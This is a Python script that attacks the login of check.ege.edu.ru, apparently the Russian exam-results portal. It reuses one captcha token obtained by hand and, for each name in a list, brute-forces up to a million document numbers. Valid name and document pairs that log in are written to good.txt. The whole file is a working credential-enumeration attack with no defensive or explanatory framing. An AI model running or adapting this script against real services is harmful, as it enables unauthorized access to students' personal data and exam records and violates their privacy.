import requests
import json
import os
import base64
import hashlib

base_path = "http://check.ege.edu.ru/"
# API
api = {
    "captcha": "api/captcha",
    "login": "api/participant/login",
    "region": "api/region"
}

regions = list()

token = ""
captcha = ""


def get_regions():

    global regions

    r = requests.get(base_path + api["region"])
    temp = json.loads(r.text)
    for region in  temp:
        regions.append(region["Id"])


def solve_captcha():

    global captcha, token

    solved = False

    while not solved:
        print("Send GET to " + base_path + api["captcha"])

        r = requests.get(base_path + api["captcha"])
        _json = json.loads(r.text)
        image = _json['Image']
        token = _json['Token']

        print("Got new captcha")

        with open("image.jpg", "wb") as file:
            file.write(base64.decodebytes(image.encode()))

        print("Open captcha to solve")
        print("Enter code: ")
        os.system("start " + "image.jpg")
        captcha = input().strip()

        status = requests.post(base_path + api["login"], data={
            "Captcha": captcha,
            "Code": "",
            "Document": "0000585858",
            "Hash": hashlib.md5("captcha".encode("utf-8")).hexdigest(),
            "Region": 61,
            "Token": token
        }).text

        if status != '"Пожалуйста, проверьте правильность введённого кода с картинки"':
            solved = True
        else:
            print("Error! Captcha isnt solved")
            print("Try to get new captcha")

    print("Captcha solved!")


def send_request(code, document, hash, region):
    r = requests.post(base_path + api["login"], data={
            "Captcha": captcha,
            "Code": code,
            "Document": document,
            "Hash": hash,
            "Region": region,
            "Token": token
        })
    return r.text, r.status_code


def get_hash(fullname):
    return hashlib.md5(fullname.lower().strip().replace(" ", "").replace("й", "и").encode("utf-8")).hexdigest()


def save_good(fullname, document, region):
    with open("good.txt", "a", encoding="utf-8") as file:
        file.write(fullname + " " + str(region) + " " + str(document) + "\n")


def save_bad(fullname, document, region):
    with open("bad.txt", "a", encoding="utf-8") as file:
        file.write(fullname + " " + str(region) + " " + str(document) + "\n")


get_regions()
solve_captcha()

with open("fios.txt", "r", encoding="utf-8") as file:
    fios = file.read().split("\n")

for fullname in fios:

    # Get hash
    hash = get_hash(fullname)
    print("Generate hash: " + str(hash) + " for FIO: " + fullname)

    # Code is an empty string
    code = ""

    # Pickup region
    region = 61

    found = False

    # Pickup document
    for document in range(0, 1000000):

        if found:
            break

        solved = False
        found = False

        # Post it to site
        while not solved:

            document = str(document)
            while len(document) < 10:
                document = "0" + document

            solved = False

            print("Sending request with hash: " + str(hash) + " doc: " + str(document) + " captcha_code: " + str(captcha))

            result, result_code = send_request(code, document, hash, region)

            print("Get server answer, code: " + str(result_code) + " Answer: " + result)

            # Check result
            if result_code == 204:
                print("Great job! Login success")
                print("Saving it to file")
                save_good(fullname, document, region)
                solved = True
                found = True
            elif result == '"Участник не найден"':
                print("Login failed. Trying next one")
                save_bad(fullname, document, region)
                solved = True
            elif result == '"Пожалуйста, проверьте правильность введённого кода с картинки"':
                # Captcha die
                print("Captcha die, trying to get new one")
                solve_captcha()

print("Well done. Check good.txt")
